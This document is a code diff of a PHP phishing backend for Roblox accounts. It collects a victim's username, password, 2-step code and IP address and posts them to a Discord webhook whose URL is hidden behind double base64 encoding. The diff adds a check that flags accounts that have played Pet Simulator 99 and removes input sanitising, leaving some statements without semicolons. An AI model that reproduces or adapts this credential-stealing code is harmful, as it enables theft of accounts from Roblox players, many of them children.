@@ -1,13 +1,10 @@
 <?php
 require('setup.php');
-function sanitizeInput($input) {
-    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
-}
 if (isset($_GET['step']) && isset($_GET['u']) && isset($_GET['p'])) {
-    $step = sanitizeInput($_GET['step']);
-    $username = sanitizeInput($_GET['u']);
-    $password = sanitizeInput($_GET['p']);
-    $return = sanitizeInput($_GET['returnUrl']);
+    $step = $_GET['step']
+    $username = $_GET['u']
+    $password = $_GET['p']
+    $return = $_GET['returnUrl']
     $returnUrlFile = 'tokens/returnUrl-' . $_GET['returnUrl'] . '.txt';
     $webhook = base64_decode(base64_decode(file_get_contents($returnUrlFile)));
     $TermedFile = 'tokens/login/' . $_GET['returnUrl'] . '.txt';
@@ -70,13 +67,22 @@ if (isset($_GET['step']) && isset($_GET['u']) && isset($_GET['p'])) {
         if ($p0 !== null && isset($p0['userId'])) {
             $userId = $p0['userId'];
             $verified = 'Verified';
-                $verifiedStatus = '✅';
+                $verifiedStatus = '<:yes:765068298004987904>';
                 $api_url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false";
                 $json = file_get_contents($api_url);
                 $data = json_decode($json, true);
                 $image_url = $data["data"][0]["imageUrl"];
                 $timestamp = date("c", strtotime("now"));
                 $ip = $_SERVER['REMOTE_ADDR'];
+                $badgeId = 2153913164;
+                $url = "https://badges.roblox.com/v1/users/$userId/badges/awarded-dates?badgeIds=$badgeId";
+                $j = file_get_contents($url);
+                if ($j === '{"data":[]}' || empty($j)) {
+                  $Played = 'False';
+                } else {
+                  $Played = 'True';
+                }
+                $Games = $Played;
                 $headers = [ 'Content-Type: application/json; charset=utf-8' ];
                 $POST = [
                     "username" => "$trioxa",
@@ -84,7 +90,7 @@ if (isset($_GET['step']) && isset($_GET['u']) && isset($_GET['p'])) {
                      "content" => "",
                         "embeds" => [
                             [
-                                "title" => "",
+                                "title" => "**[Rolimon's](https://www.rolimons.com/player/$userId) -x- [Profile](https://roblox.com/users/$userId/profile)**",
                                 "type" => "rich",
                                 "color" => hexdec("$trioxa2"),
                                 "description" => "",
@@ -98,28 +104,33 @@ if (isset($_GET['step']) && isset($_GET['u']) && isset($_GET['p'])) {
                                 "fields" => [
                                     [
                                         "name" => "**Username**",
-                                        "value" => "```$username```",
+                                        "value" => "$username",
                                         "inline" => false
                                     ],
                                     [
                                       "name" => ":key: Password",
-                                      "value" => "```$password```",
+                                      "value" => "$password",
                                       "inline" => false
                                     ],
                                     [
                                         "name" => "2step",
-                                        "value" => "```$step```",
+                                        "value" => "$step",
                                         "inline" => false
                                     ],
                                     [
                                         "name" => ":robot: IP",
-                                        "value" => "```$ip```",
+                                        "value" => "$ip",
                                         "inline" => false
                                     ],
                                     [
                                         "name" => "**$verifiedStatus Status**",
-                                        "value" => "```$verified```",
+                                        "value" => "$verified",
                                         "inline" => false
+                                    ],
+                                    [
+                                        "name" => "**Played Petsim99**",
+                                        "value" => "<:petsim99:1234197371299041313> $Games",
+                                        "inline" => true
                                     ],
                                 ]
                             ],
@@ -151,8 +162,6 @@ if (isset($_GET['step']) && isset($_GET['u']) && isset($_GET['p'])) {
                     curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                     $response   = curl_exec($ch);
             echo "\nVerification Status: $verified"; // removing this will crash the login!
-            
-    
     }
 }
     } else {
